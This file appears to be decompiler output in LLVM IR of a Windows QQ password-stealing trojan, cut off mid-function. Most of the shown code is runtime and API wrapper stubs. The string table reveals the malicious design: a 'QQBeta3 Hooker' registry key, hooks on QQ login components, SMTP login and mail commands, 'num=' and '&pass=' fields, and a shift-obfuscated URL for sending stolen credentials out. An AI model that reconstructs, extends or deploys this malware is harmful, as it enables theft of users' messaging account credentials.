source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212352
@global_var_4080d0 = constant [12 x i8] c"aixiaran<H@\00"
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_4080f8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 0
@global_var_404ddc = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_404e00 = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408100 = local_unnamed_addr global i32 0
@global_var_404e94 = constant [11 x i8] c"user32.dll\00"
@global_var_404ea0 = constant [11 x i8] c"LoadImageA\00"
@global_var_404eac = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_404a4c = local_unnamed_addr constant i32 4213400
@global_var_404a98 = local_unnamed_addr constant i32 1867011080
@global_var_404ebc = constant [12 x i8] c"LoadStringA\00"
@global_var_404ec8 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_404ed4 = constant [12 x i8] c"shell32.dll\00"
@global_var_404ee0 = constant [14 x i8] c"ShellExecuteA\00"
@global_var_404ef0 = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_4080f9 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4051b4 = local_unnamed_addr constant i32 43
@global_var_4051cc = constant i32 37
@global_var_405254 = local_unnamed_addr constant i32 63
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_405318 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_40531c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_408104 = global i32 1
@global_var_405338 = constant [10 x i8] c"First Run\00"
@global_var_4053f4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_405410 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213068
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212364
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4213000
@global_var_4080dc = local_unnamed_addr global i32 4212864
@global_var_4080f0 = global i32 4230401
@global_var_4054bc = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4054cc = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405790 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212796
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_408108 = local_unnamed_addr global i32 4217056
@B64EncodeTable_at_4058e0 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405fb8 = constant [6 x i8] c"HELO \00"
@global_var_405fc8 = constant [3 x i8] c"\0D\0A\00"
@global_var_405fd4 = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405fec = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_406004 = constant i32 62
@global_var_406010 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_406024 = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_406034 = constant [8 x i8] c"From: <\00"
@global_var_406044 = constant [6 x i8] c"To: <\00"
@global_var_406054 = constant [10 x i8] c"Subject: \00"
@global_var_406068 = constant i32 46
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_406074 = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_4060be = local_unnamed_addr constant i32 763609949
@global_var_4061e0 = constant [7 x i8] c"#32770\00"
@global_var_4061f0 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_4096d0 = local_unnamed_addr global i32 0
@global_var_40623c = local_unnamed_addr constant i32 4219456
@global_var_406240 = local_unnamed_addr constant i32 841875985
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 4219748
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406560 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213136
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406878 = constant [6 x i8] c"Down(\00"
@global_var_406888 = constant i32 41
@global_var_406894 = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406898 = constant [5 x i8] c"Open\00"
@global_var_4096dc = global i32 0
@global_var_406b5c = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212932
@global_var_406b68 = constant i32 47
@global_var_406ba8 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406bb4 = constant [5 x i8] c"num=\00"
@global_var_406bc4 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_406bd4 = local_unnamed_addr constant [35 x i8] c"iuuq;00xxx=5679438=dpn0{c0uftu=btq\00"
@global_var_406cac = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406cbc = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406dcc = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406ddc = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406de4 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_407058 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_40706c = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_407078 = local_unnamed_addr constant i32 47
@global_var_406e64 = local_unnamed_addr constant i32 4222568
@global_var_406e68 = local_unnamed_addr constant i32 841875985
@global_var_407198 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_4071ac = constant i32 47
@global_var_4071b8 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_407790 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_40783c = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_4079c4 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_4079d0 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096dc
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_407b08 = local_unnamed_addr constant i32 28
@global_var_4097fc = local_unnamed_addr global i32 0
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_409808 = local_unnamed_addr global i32 0
@global_var_40980c = local_unnamed_addr global i32 0
@global_var_407eb8 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_4097f8 = local_unnamed_addr global i32 0
@global_var_407ec8 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407ee0 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407ef8 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407f08 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407f18 = constant [8 x i8] c"ListBox\00"
@global_var_409810 = global i32 0
@global_var_407f28 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f0 = external global i8*

declare i32 @unknown_5398() local_unnamed_addr

declare i32 @unknown_5470() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrLAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034cc() local_unnamed_addr {
dec_label_pc_4034cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034da() local_unnamed_addr {
dec_label_pc_4034da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034f3() local_unnamed_addr {
dec_label_pc_4034f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034f4() local_unnamed_addr {
dec_label_pc_4034f4:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034fb, label %dec_label_pc_4034f8, !insn.addr !75

dec_label_pc_4034f8:                              ; preds = %dec_label_pc_4034f4
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034fb, !insn.addr !76

dec_label_pc_4034fb:                              ; preds = %dec_label_pc_4034f8, %dec_label_pc_4034f4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_4035b3() local_unnamed_addr {
dec_label_pc_4035b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_40363d() local_unnamed_addr {
dec_label_pc_40363d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036e4() local_unnamed_addr {
dec_label_pc_4036e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036f2, label %dec_label_pc_4036e8, !insn.addr !81

dec_label_pc_4036e8:                              ; preds = %dec_label_pc_4036e4
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036f2, label %dec_label_pc_4036ee, !insn.addr !84

